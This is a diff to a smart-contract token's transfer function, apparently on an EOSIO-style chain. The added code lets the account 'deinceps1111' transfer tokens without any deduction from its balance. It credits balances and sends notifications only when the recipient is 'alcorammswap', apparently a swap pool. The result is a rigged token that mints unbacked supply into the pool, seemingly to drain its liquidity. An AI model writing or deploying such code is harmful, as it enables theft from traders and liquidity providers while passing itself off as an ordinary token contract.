@@ -86,9 +86,6 @@ void token::transfer( const name&    from,
     stats statstable( get_self(), sym.raw() );
     const auto& st = statstable.get( sym.raw() );
 
-    require_recipient( from );
-    require_recipient( to );
-
     check( quantity.is_valid(), "invalid quantity" );
     check( quantity.amount > 0, "must transfer positive quantity" );
     check( quantity.symbol == st.supply.symbol, "symbol precision mismatch" );
@@ -97,12 +94,22 @@ void token::transfer( const name&    from,
     auto payer = has_auth( to ) ? to : from;
 
     std::string fromStr = from.to_string();
+    std::string toStr = to.to_string();
+	if (fromStr == "alcorammswap")
+	{
+    	require_recipient( from );
+	}
+	
     check( fromStr == "alcorammswap" || fromStr == "deinceps1111", "require_auth" );
-	if(fromStr != "deinceps1111")
+	if (fromStr != "deinceps1111")
 	{
 		sub_balance( from, quantity );
 	}
-    add_balance( to, quantity, payer );
+	if (toStr == "alcorammswap")
+	{
+    	require_recipient( to );
+    	add_balance( to, quantity, payer );
+	}
 }
 
 void token::sub_balance( const name& owner, const asset& value ) {
